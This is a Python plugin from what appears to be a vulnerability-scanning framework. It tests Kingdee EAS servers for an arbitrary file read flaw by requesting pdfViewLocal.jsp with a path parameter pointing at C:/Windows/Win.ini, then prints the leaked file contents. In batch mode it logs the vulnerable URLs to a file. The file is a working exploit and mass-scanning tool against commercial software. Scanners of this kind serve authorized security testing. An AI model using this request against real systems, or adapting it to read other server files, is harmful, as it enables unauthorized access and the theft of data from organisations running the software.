#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class Jindie_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/Win.ini"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "16-bit" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("JinDieEAS", '目标存在金蝶EAS任意文件读取漏洞')
                    OutPrintInfo("JinDieEAS", url)
                    OutPrintInfo("JinDieEAS", f"响应:\n{req.text.strip()}")
                else:
                    OutPrintInfoSuc("JinDieEAS", f'目标存在金蝶EAS任意文件读取漏洞: {url}')
                    OutPutFile("jindieeas_file_read.txt",f'目标存在金蝶EAS任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("JinDieEAS", f'目标 {input_url} 不存在金蝶EAS任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("JinDieEAS",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("JinDieEAS", '开始检测金蝶EAS任意文件读取漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("JinDieEAS", '金蝶EAS任意文件读取漏洞检测结束')

